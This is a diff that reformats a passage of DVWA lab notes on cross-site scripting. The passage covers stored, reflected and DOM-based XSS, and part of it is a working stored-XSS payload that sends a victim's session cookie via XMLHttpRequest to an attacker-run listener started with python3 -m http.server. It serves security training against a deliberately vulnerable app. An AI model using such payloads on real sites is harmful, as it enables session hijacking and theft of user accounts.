@@ -216,69 +216,84 @@ In this highest level of security, DVWA employs whitelisting techniques to restr
 
 ---
 
-6. Cross-Site Scripting (XSS)
-   XSS Overview
-   XSS is a web vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to data theft, session hijacking, and other security risks.
+## 6. Cross-Site Scripting (XSS)
 
-Leaking Session Cookies with XSS (Stored)
+### XSS Overview
+
+XSS is a web vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to data theft, session hijacking, and other security risks.
+
+### Leaking Session Cookies with XSS (Stored)
+
 Stored XSS persists in the database and is executed whenever the affected page is loaded.
 
-Basic Payload:
+1. **Basic Payload**:
+   ```html
+   <script>
+     alert(22)
+   </script>
+   ```
+2. **Retrieve Cookies via Console**:
 
-html
-Copy code
+   ```javascript
+   document.cookie
+   ```
 
-<script>alert(22)</script>
+3. **Exfiltration Payload**:
+   Start a local HTTP server to capture cookies:
+   ```bash
+   python3 -m http.server 1337
+   ```
+   Payload to send cookie data to the attacker’s server:
+   ```html
+   <script>
+     var xhr = new XMLHttpRequest()
+     xhr.open('GET', `http://localhost:1337/${document.cookie}`, false)
+     xhr.send(null)
+   </script>
+   ```
 
-Retrieve Cookies via Console:
+### Useful Docker Commands
 
-javascript
-Copy code
-document.cookie
-Exfiltration Payload: Start a local HTTP server to capture cookies:
+- View running containers:
+  ```bash
+  docker ps
+  ```
+- View Docker images:
+  ```bash
+  docker images
+  ```
 
-bash
-Copy code
-python3 -m http.server 1337
-Payload to send cookie data to the attacker’s server:
+### XSS (Reflected)
 
-html
-Copy code
-
-<script>
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', `http://localhost:1337/${document.cookie}`, false);
-    xhr.send(null);
-</script>
-
-Useful Docker Commands
-View running containers:
-bash
-Copy code
-docker ps
-View Docker images:
-bash
-Copy code
-docker images
-XSS (Reflected)
 Reflected XSS occurs when malicious scripts are reflected off a web server, typically via URL parameters:
 
-url
-Copy code
+```url
 http://example.com/search?query=<script>alert(22)</script>
-XSS (DOM-Based)
+```
+
+### XSS (DOM-Based)
+
 In DOM-based XSS, the vulnerability lies in the client-side JavaScript code that dynamically updates the page based on user input. Inject JavaScript payloads to test for execution:
 
-html
-Copy code
+```html
+<script>
+  /* Malicious code here */
+</script>
+```
 
-<script>/* Malicious code here */</script>
+---
 
-Important Notes
-Always validate and sanitize user inputs to prevent vulnerabilities.
-Use tools like Burp Suite for intercepting requests and wfuzz for fuzzing.
-Convert special characters to URL encoding where necessary.
-Disclaimer
+### Important Notes
+
+- Always validate and sanitize user inputs to prevent vulnerabilities.
+- Use tools like **Burp Suite** for intercepting requests and **wfuzz** for fuzzing.
+- **Convert special characters to URL encoding** where necessary.
+
+### References
+
+- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+- [OWASP Directory Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
+- [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
 
 ---
 
